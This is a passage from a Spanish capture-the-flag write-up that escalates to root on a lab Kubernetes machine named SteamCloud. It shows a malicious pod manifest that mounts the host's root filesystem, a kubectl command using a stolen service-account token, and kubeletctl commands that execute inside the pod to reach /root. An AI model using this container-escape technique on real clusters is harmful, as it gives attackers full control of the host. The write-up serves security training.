        startedAt: "2022-04-04T12:31:03Z"
  hostIP: 10.10.11.133
  phase: Running
  podIP: 172.17.0.3
  podIPs:
  - ip: 172.17.0.3
  qosClass: BestEffort
  startTime: "2022-04-04T12:31:02Z"
------------------------------ pod.yaml --------------------------------------
```

```bash
Lo modificamos a lo siguiente: 
------------------------------- Evil Pod.yaml ----------------------------------
apiVersion: v1
kind: Pod
metadata:
  name: koh-pod
  namespace: default
spec:
  containers:
  - name: koh-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /

-----------------------------------------------
```
Desplegando el Pod malicioso
```bash
Lo desplegamos de la siguiente forma

# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' apply -f pod.yaml

pod/koh-pod created
```
```bash
Verificamos los pods existentes

# kubeletctl -s 10.10.11.133 pods                                                                                     1 ⨯ 1 ⚙
┌─────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                                │
├────┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│    │ POD                                │ NAMESPACE   │ CONTAINERS              │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  1 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  3 │ koh-pod                            │ default     │ koh-pod                 │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  5 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  6 │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  7 │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  8 │ nginx                              │ default     │ nginx                   │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  9 │ kohh-pod                           │ default     │ kohh-pod                │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 10 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│    │                                    │             │                         │
└────┴────────────────────────────────────┴─────────────┴─────────────────────────┘

# kubeletctl -s 10.10.11.133 scan rce                                                                                 
┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                   │
├────┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│    │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│    │              │                                    │             │                         │ RUN │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  1 │ 10.10.11.133 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  2 │              │ koh-pod                            │ default     │ koh-pod                 │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  3 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  4 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  5 │              │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  6 │              │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  7 │              │ nginx                              │ default     │ nginx                   │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  8 │              │ kohh-pod                           │ default     │ kohh-pod                │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  9 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 10 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
└────┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

Procedemos a conectarnos al pod-malicioso creado
```bash
Comprobando que tenemos el directorio / montado en /mnt en el nuestro pod desplegado
# kubeletctl -s 10.10.11.133 -p koh-pod -c koh-pod exec "ls -l /mnt"   
total 60
lrwxrwxrwx   1 root root     7 Nov 30 11:36 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Nov 30 18:43 boot
drwxr-xr-x  16 root root  3080 Apr  4 12:29 dev
drwxr-xr-x  75 root root  4096 Jan 10 14:03 etc
drwxr-xr-x   3 root root  4096 Nov 30 11:44 home
lrwxrwxrwx   1 root root    31 Nov 30 11:38 initrd.img -> boot/initrd.img-4.19.0-18-amd64
lrwxrwxrwx   1 root root    31 Nov 30 11:37 initrd.img.old -> boot/initrd.img-4.19.0-14-amd64
lrwxrwxrwx   1 root root     7 Nov 30 11:36 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Nov 30 11:36 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Nov 30 11:36 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Nov 30 11:36 libx32 -> usr/libx32
drwx------   2 root root 16384 Nov 30 11:36 lost+found
drwxr-xr-x   3 root root  4096 Nov 30 11:36 media
drwxr-xr-x   2 root root  4096 Nov 30 11:36 mnt
drwxr-xr-x   5 root root  4096 Jan 10 14:03 opt
dr-xr-xr-x 204 root root     0 Apr  4 12:28 proc
drwx------   4 root root  4096 Jan 10 14:03 root
drwxr-xr-x  20 root root   620 Apr  4 12:30 run
lrwxrwxrwx   1 root root     8 Nov 30 11:36 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Nov 30 11:36 srv
dr-xr-xr-x  13 root root     0 Apr  4 12:28 sys
drwxrwxrwt  11 root root  4096 Apr  4 13:47 tmp
drwxr-xr-x  14 root root  4096 Nov 30 12:17 usr
drwxr-xr-x  11 root root  4096 Nov 30 11:36 var
lrwxrwxrwx   1 root root    28 Nov 30 11:38 vmlinuz -> boot/vmlinuz-4.19.0-18-amd64
lrwxrwxrwx   1 root root    28 Nov 30 11:37 vmlinuz.old -> boot/vmlinuz-4.19.0-14-amd64
```

Sacando la pass root.txt
```bash
# kubeletctl -s 10.10.11.133 -p koh-pod -c koh-pod exec "ls -l /mnt/root/"                                                 1 ⚙
total 4
-rw-r--r-- 1 root root 33 Apr  4 12:29 root.txt
```

SteamCloud Rooted ~ K0H4ck